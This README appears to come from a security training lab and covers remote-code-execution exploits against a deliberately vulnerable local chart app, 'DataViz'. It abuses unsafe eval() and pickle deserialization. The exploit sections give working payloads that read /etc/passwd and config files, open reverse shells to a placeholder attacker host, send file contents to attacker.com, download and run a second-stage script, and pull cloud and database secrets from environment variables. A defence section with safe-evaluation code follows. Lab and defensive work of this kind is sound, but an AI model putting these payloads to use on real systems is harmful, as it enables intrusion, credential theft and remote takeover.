# DataViz - Remote Code Execution (RCE) Exploits

## Overview
These exploits target code execution vulnerabilities in DataViz's chart rendering and pickle deserialization features.

## Target Application
- **Project**: DataViz
- **Port**: 5002
- **Vulnerable Features**: 
  - Chart formula evaluation (uses `eval()`)
  - Pickle deserialization for chart states
- **Vulnerabilities**: Unsafe eval() and pickle.loads()

## Prerequisites
```bash
# Ensure DataViz is running
docker-compose up -d dataviz
curl http://localhost:5002
```

## Exploits

### 1. eval_rce.py
Exploits unsafe `eval()` in chart formula processing.

**Usage:**
```bash
python3 eval_rce.py
```

**What it does:**
- Sends malicious formulas to chart calculation endpoint
- Exploits `eval()` function used for mathematical expressions
- Executes arbitrary Python code
- Can access file system, network, and execute commands

**Expected Output:**
```
[+] Targeting: http://localhost:5002/calculate
[+] Exploit: eval() in formula processing
[+] Payload: __import__('os').popen('whoami').read()
[+] Sending malicious formula...
[+] Response: root
[+] RCE successful!
```

**Customization:**
Edit the payload in the script:
```python
# Read files
formula = "__import__('os').popen('cat /etc/passwd').read()"

# Environment variables
formula = "__import__('os').environ"

# Network access
formula = "__import__('urllib.request').urlopen('http://attacker.com').read()"

# Reverse shell
formula = "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"
```

### 2. pickle_rce.py
Exploits pickle deserialization for remote code execution.

**Usage:**
```bash
python3 pickle_rce.py
```

**What it does:**
- Creates malicious pickled object with `__reduce__` method
- Sends to chart state loading endpoint
- Triggers automatic code execution on unpickling
- Achieves RCE when victim loads the "chart"

**Expected Output:**
```
[+] Targeting: http://localhost:5002/load_chart
[+] Creating pickle RCE payload...
[+] Command: id
[+] Serializing malicious object...
[+] Sending payload...
[+] Response:
uid=0(root) gid=0(root) groups=0(root)
[+] Remote code execution successful!
```

## Attack Scenarios

### Scenario 1: eval() Exploitation

#### Test Vulnerability:
```bash
# Simple test
curl -X POST http://localhost:5002/calculate \
  -H "Content-Type: application/json" \
  -d '{"formula":"2+2"}'

# Malicious test
curl -X POST http://localhost:5002/calculate \
  -H "Content-Type: application/json" \
  -d '{"formula":"__import__('"'"'os'"'"').system('"'"'whoami'"'"')"}'
```

#### Payloads:
```python
# 1. File read
__import__('os').popen('cat /app/config.py').read()

# 2. Directory listing
[f for f in __import__('os').listdir('/')]

# 3. Execute shell commands
__import__('subprocess').check_output(['ls','-la']).decode()

# 4. Reverse shell
__import__('os').system('bash -c "exec bash -i &>/dev/tcp/ATTACKER_IP/4444 <&1"')

# 5. Data exfiltration
__import__('urllib.request').urlopen('http://attacker.com/steal?data='+__import__('os').popen('cat /etc/passwd').read())
```

### Scenario 2: Pickle Exploitation

#### Create Payload:
```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('nc -e /bin/bash ATTACKER_IP 4444',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

#### Send Payload:
```bash
curl -X POST http://localhost:5002/load_chart \
  -H "Content-Type: application/json" \
  -d "{\"state\":\"$PAYLOAD\"}"
```

## Advanced Exploitation

### 1. Sandbox Escape (If eval has restrictions)
```python
# Access builtins
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0](['whoami'])

# Import via exec
exec("import os; os.system('whoami')")

# Alternative import methods
__import__('os').system('id')
__builtins__.__import__('os').system('id')
getattr(__builtins__, '__import__')('os').system('id')
```

### 2. Multi-Stage Exploitation
```python
# Stage 1: Download second stage
__import__('urllib.request').urlretrieve('http://attacker.com/stage2.py', '/tmp/s2.py')

# Stage 2: Execute downloaded payload
exec(open('/tmp/s2.py').read())
```

### 3. Credential Harvesting
```python
# Extract environment variables (may contain secrets)
__import__('os').environ.get('DATABASE_PASSWORD')
__import__('os').environ.get('SECRET_KEY')
__import__('os').environ.get('AWS_SECRET_ACCESS_KEY')

# Read config files
open('/app/config.py').read()
open('/app/.env').read()
```

## Defense Recommendations

### 1. Never Use eval() on User Input
```python
# VULNERABLE CODE:
formula = request.json.get('formula')
result = eval(formula)  # EXTREMELY DANGEROUS!

# SECURE ALTERNATIVES:

# Option A: Use ast.literal_eval (only for literals)
import ast
formula = request.json.get('formula')
result = ast.literal_eval(formula)  # Only allows: strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None

# Option B: Use safe math parser
from pyparsing import nums, oneOf, opAssoc, infixNotation
# Implement safe math expression parser

# Option C: Use sympy
from sympy import sympify
from sympy.parsing.sympy_parser import standard_transformations
result = sympify(formula, transformations=standard_transformations)
```

### 2. Safe Expression Evaluation
```python
import operator
import ast

class SafeEvaluator:
    """Safely evaluate mathematical expressions"""
    
    SAFE_OPERATORS = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow,
    }
    
    def eval_expr(self, expr_string):
        node = ast.parse(expr_string, mode='eval').body
        return self._eval_node(node)
    
    def _eval_node(self, node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.BinOp):
            op_type = type(node.op)
            if op_type not in self.SAFE_OPERATORS:
                raise ValueError(f"Unsafe operator: {op_type}")
            left = self._eval_node(node.left)
            right = self._eval_node(node.right)
            return self.SAFE_OPERATORS[op_type](left, right)
        else:
            raise ValueError(f"Unsafe expression: {type(node)}")

# Usage
evaluator = SafeEvaluator()
result = evaluator.eval_expr("2 + 3 * 4")  # Safe
```

### 3. Replace Pickle with JSON
```python
# VULNERABLE CODE:
import pickle
chart_state = pickle.loads(user_data)  # DANGEROUS!

# SECURE CODE:
import json
chart_state = json.loads(user_data)  # Safe
```

### 4. Input Validation
```python
import re

def validate_formula(formula):
    # Whitelist allowed characters
    if not re.match(r'^[\d\s\+\-\*/\(\)\.]+$', formula):
        raise ValueError("Invalid characters in formula")
    
    # Blacklist dangerous keywords
    dangerous = ['import', '__', 'exec', 'eval', 'compile', 'open', 'file']
    if any(word in formula.lower() for word in dangerous):
        raise ValueError("Dangerous keywords detected")
    
    # Length limit
    if len(formula) > 100:
        raise ValueError("Formula too long")
    
    return formula
```

### 5. Sandboxing
```python
# Use RestrictedPython
from RestrictedPython import compile_restricted, safe_globals

def safe_eval(code):
    byte_code = compile_restricted(
        code,
        filename='<inline>',
        mode='eval'
    )
    
    return eval(byte_code, {"__builtins__": safe_globals})
```

## Testing for Vulnerabilities

### Automated Testing:
```bash
# Test eval vulnerability
for payload in "__import__('os').system('id')" "open('/etc/passwd').read()" "exec('import os')"; do
    echo "Testing: $payload"
    curl -X POST http://localhost:5002/calculate \
         -H "Content-Type: application/json" \
         -d "{\"formula\":\"$payload\"}"
done
```

## Notes
**CRITICAL WARNING**: eval() and pickle on user input = instant RCE
- **eval()**: Never use on any user-controlled input, even "sanitized"
- **pickle**: Only for trusted data, never from users
- Both allow arbitrary code execution with NO safe way to filter

**Common Misconceptions:**
- "I'll blacklist dangerous functions" → Easily bypassed
- "I'll use regex to filter" → Always incomplete
- "I'll sanitize the input" → Impossible for eval/pickle
- "I'll use a safe alternative" → Correct approach

**Real-World Impact:**
- Complete server compromise
- Data theft
- Ransomware deployment
- Lateral movement
- Supply chain attacks

## Related Exploits
- See `../deserialization/` for more pickle exploitation techniques
- See `../ssrf/` for SSRF to internal services after RCE
